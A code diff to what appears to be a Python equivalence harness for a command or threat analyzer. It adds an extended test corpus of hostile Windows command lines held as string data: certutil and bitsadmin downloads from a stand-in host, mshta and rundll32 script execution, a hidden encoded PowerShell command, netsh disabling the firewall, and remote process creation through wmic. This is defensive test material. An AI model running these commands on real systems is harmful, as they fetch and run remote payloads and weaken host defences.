@@ -53,6 +53,41 @@ M0A_CORPUS = {
 }
 
 
+# ── Extended corpus (owner note 2026-02-15: "test not only sample1") ──
+# Diverse real-world payloads.  Same guarantees hold as for M0A_CORPUS:
+#   • harness never mutates production code
+#   • no scope creep — still string inputs mapped to existing capabilities
+#   • no expected-hash lock (extended corpus is exploratory equivalence
+#     evidence, not a regression baseline)
+EXTENDED_CORPUS = {
+    "lolbas_certutil_download":
+        "certutil.exe -urlcache -split -f http://198.51.100.20/payload.exe %TEMP%\\a.exe",
+    "lolbas_bitsadmin_transfer":
+        "bitsadmin /transfer j http://198.51.100.20/ps.txt %APPDATA%\\p.ps1",
+    "lolbas_mshta_javascript":
+        "mshta.exe javascript:a=new%20ActiveXObject(\"WScript.Shell\");a.Run(\"calc.exe\");close();",
+    "lolbas_rundll32_javascript":
+        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%20ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\");",
+    "cmd_chain_amp":
+        "whoami && net user && ipconfig /all",
+    "powershell_encoded_realistic":
+        "powershell -nop -w hidden -EncodedCommand JABjAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=",
+    "base64_wrapping_iocs":
+        "aHR0cDovL2V2aWwuZXhhbXBsZS5jb20vcGF5bG9hZC5leGUgZGVsaXZlcnMgYSByYW5zb213YXJl",  # b64 of a real-ish sentence
+    "narrative_short_attack":
+        ("The actor deployed a remote access trojan and used PowerShell "
+          "to execute an encoded command that reached out to a C2 server."),
+    "netsh_firewall_off":
+        "netsh advfirewall set allprofiles state off",
+    "wmic_process_create":
+        "wmic /node:target process call create \"cmd.exe /c whoami\"",
+    "url_with_suspicious_path":
+        "https://example-cdn.attacker.test/download/payload.hta",
+    "empty_input":
+        "",
+}
+
+
 def _sha256(obj: Any) -> str:
     return hashlib.sha256(
         json.dumps(obj, default=str, sort_keys=True).encode()).hexdigest()
@@ -171,16 +206,14 @@ def run_router(text: str) -> Dict[str, Any]:
         "unmapped_engines": proj.unmapped_engines,
         "outcomes":         ordered_outcomes,
         "plumbing_gaps":    plumbing_gaps,
-        "envelope":         outputs_by_step.get("s00_die_command_v1")
-                           or outputs_by_step.get("s01_die_command_v1")
-                           or outputs_by_step.get("s02_die_command_v1"),
-        "report":           _find_report_output(outputs_by_step),
+        "envelope":         _find_output_by_entry(outputs_by_step, "die_command_v1"),
+        "report":           _find_output_by_entry(outputs_by_step, "report_narrative_v1"),
     }
 
 
-def _find_report_output(outputs: Dict[str, Any]) -> Any:
+def _find_output_by_entry(outputs: Dict[str, Any], entry_id_suffix: str) -> Any:
     for k, v in outputs.items():
-        if "report_narrative" in k:
+        if entry_id_suffix in k:
             return v
     return None
 
@@ -340,9 +373,11 @@ def _classify_differences(name: str, legacy: Dict, router: Dict) -> Dict[str, li
 # ────────────────────────────────────────────────────────────────────
 #   Public entry-point
 # ────────────────────────────────────────────────────────────────────
-def run_equivalence_harness() -> Dict[str, Any]:
+def run_equivalence_harness(corpus: Dict[str, str] | None = None) -> Dict[str, Any]:
+    if corpus is None:
+        corpus = M0A_CORPUS
     records = []
-    for name, text in M0A_CORPUS.items():
+    for name, text in corpus.items():
         legacy = run_legacy(text)
         router = run_router(text)
         diffs  = _classify_differences(name, legacy, router)
